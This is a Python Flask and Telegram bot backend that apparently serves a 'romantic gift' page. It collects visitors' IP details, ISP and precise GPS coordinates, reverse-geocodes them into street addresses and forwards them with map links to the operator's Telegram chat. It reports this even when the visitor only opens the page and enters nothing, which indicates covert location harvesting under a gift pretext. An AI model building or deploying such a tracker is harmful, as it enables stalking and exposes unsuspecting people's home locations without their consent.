import os
import logging
import requests
from telegram import Bot
from dotenv import load_dotenv
from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import threading

load_dotenv()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN')
YOUR_CHAT_ID = os.getenv('CHAT_ID')

bot = Bot(token=BOT_TOKEN)

app = Flask(__name__)
CORS(app)

def send_telegram_in_thread(chat_id: str, message: str):
    """Send message in separate thread with new event loop"""
    def run_async():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(
                bot.send_message(chat_id=chat_id, text=message, parse_mode='HTML')
            )
            logger.info(f"Message sent to {chat_id}")
            return True
        except Exception as e:
            logger.error(f"Error sending message: {e}")
            return False
        finally:
            loop.close()
    
    thread = threading.Thread(target=run_async)
    thread.start()
    thread.join(timeout=10)
    return True

def get_address_from_coordinates(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=18&addressdetails=1"
        headers = {'User-Agent': 'RomanticGiftApp/1.0'}
        
        response = requests.get(url, headers=headers, timeout=5)
        data = response.json()
        
        if 'address' in data:
            addr = data['address']
            parts = []
            
            if 'road' in addr:
                parts.append(addr['road'])
            elif 'pedestrian' in addr:
                parts.append(addr['pedestrian'])
            
            if 'house_number' in addr:
                parts.append(f"дом {addr['house_number']}")
            
            if 'neighbourhood' in addr:
                parts.append(addr['neighbourhood'])
            elif 'suburb' in addr:
                parts.append(addr['suburb'])
            elif 'district' in addr:
                parts.append(addr['district'])
            
            if 'city' in addr:
                parts.append(addr['city'])
            elif 'town' in addr:
                parts.append(addr['town'])
            
            full_address = data.get('display_name', 'Адрес не найден')
            short_address = ', '.join(parts) if parts else full_address
            
            return {'short': short_address, 'full': full_address, 'success': True}
        
        return {'short': 'Адрес не определен', 'full': 'Адрес не определен', 'success': False}
    except Exception as e:
        logger.error(f"Geocoding error: {e}")
        return {'short': 'Ошибка определения адреса', 'full': 'Ошибка определения адреса', 'success': False}

@app.route('/api/notify', methods=['POST'])
def notify():
    try:
        data = request.get_json()
        
        message_type = data.get('type', 'Уведомление')
        address = data.get('address', '')
        ip = data.get('ip', 'N/A')
        city = data.get('city', 'N/A')
        region = data.get('region', 'N/A')
        country = data.get('country', 'N/A')
        loc = data.get('loc', 'N/A')
        org = data.get('org', 'N/A')
        timestamp = data.get('timestamp', 'N/A')
        
        # GPS data
        gps_lat = data.get('gpsLat')
        gps_lon = data.get('gpsLon')
        gps_accuracy = data.get('gpsAccuracy')
        has_gps = data.get('hasGPS', False)
        
        # Get IP-based address
        ip_address_info = {'short': 'N/A', 'full': 'N/A', 'success': False}
        if loc and loc != 'N/A':
            try:
                lat, lon = loc.split(',')
                ip_address_info = get_address_from_coordinates(lat.strip(), lon.strip())
            except Exception as e:
                logger.error(f"IP coordinate parsing error: {e}")
        
        # Get GPS-based address
        gps_address_info = {'short': 'N/A', 'full': 'N/A', 'success': False}
        if has_gps and gps_lat and gps_lon:
            try:
                gps_address_info = get_address_from_coordinates(gps_lat, gps_lon)
            except Exception as e:
                logger.error(f"GPS coordinate parsing error: {e}")
        
        maps_link = f"https://www.google.com/maps?q={loc}" if loc != 'N/A' else "N/A"
        yandex_maps_link = f"https://yandex.uz/maps/?ll={loc.split(',')[1]},{loc.split(',')[0]}&z=17" if loc != 'N/A' else "N/A"
        
        gps_maps_link = f"https://www.google.com/maps?q={gps_lat},{gps_lon}" if has_gps else "N/A"
        gps_yandex_link = f"https://yandex.uz/maps/?ll={gps_lon},{gps_lat}&z=17" if has_gps else "N/A"
        
        # Build message
        if address:  # User entered address
            message = f"""
<b>🎁 АДРЕС ПОЛУЧЕН!</b>

📮 <b>Введенный адрес:</b>
{address}

━━━━━━━━━━━━━━━━━━━━━
"""
            
            # Add GPS info if available
            if has_gps and gps_lat and gps_lon:
                accuracy_text = f"±{int(gps_accuracy)}м" if gps_accuracy else "N/A"
                message += f"""
<b>📍 ТОЧНОЕ МЕСТОПОЛОЖЕНИЕ (GPS):</b>

🏠 <b>Адрес:</b> {gps_address_info['short']}

📍 <b>Координаты:</b> <code>{gps_lat}, {gps_lon}</code>
🎯 <b>Точность:</b> {accuracy_text}
🗺 <a href="{gps_maps_link}">Google Maps</a> | <a href="{gps_yandex_link}">Yandex Maps</a>

<i>Полный GPS адрес:</i>
{gps_address_info['full']}

━━━━━━━━━━━━━━━━━━━━━
"""
            
            message += f"""
<b>🌐 IP ИНФОРМАЦИЯ:</b>

IP: <code>{ip}</code>
Город: {city}
Регион: {region}
Страна: {country}
Провайдер: {org}
Время: {timestamp}
"""
        else:  # Page opened (no address entered)
            message = f"""
<b>{message_type}</b>

━━━━━━━━━━━━━━━━━━━━━
"""
            
            # Add GPS info if available
            if has_gps and gps_lat and gps_lon:
                accuracy_text = f"±{int(gps_accuracy)}м" if gps_accuracy else "N/A"
                message += f"""
<b>📍 ТОЧНОЕ МЕСТОПОЛОЖЕНИЕ (GPS):</b>

🏠 <b>Адрес:</b> {gps_address_info['short']}

📍 <b>Координаты:</b> <code>{gps_lat}, {gps_lon}</code>
🎯 <b>Точность:</b> {accuracy_text}
🗺 <a href="{gps_maps_link}">Google Maps</a> | <a href="{gps_yandex_link}">Yandex Maps</a>

<i>Полный GPS адрес:</i>
{gps_address_info['full']}

━━━━━━━━━━━━━━━━━━━━━
"""
            
            message += f"""
<b>🌐 IP ИНФОРМАЦИЯ:</b>

🏠 <b>Примерный адрес (по IP):</b> {ip_address_info['short']}

IP: <code>{ip}</code>
Город: {city}
Регион: {region}
Страна: {country}
Координаты (IP): <code>{loc}</code>
Провайдер: {org}
Время: {timestamp}

<i>⚠️ IP показывает местоположение провайдера, не точный адрес</i>
"""
        
        result = send_telegram_in_thread(YOUR_CHAT_ID, message)
        
        if result:
            return jsonify({'success': True, 'message': 'Notification sent'}), 200
        else:
            return jsonify({'success': False, 'message': 'Failed to send'}), 500
            
    except Exception as e:
        logger.error(f"Error in notify endpoint: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok', 'bot': 'running'}), 200

def main():
    logger.info("Starting Flask server with GPS support...")
    logger.info(f"Your Chat ID: {YOUR_CHAT_ID}")
    
    port = int(os.getenv('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)

if __name__ == '__main__':
    main()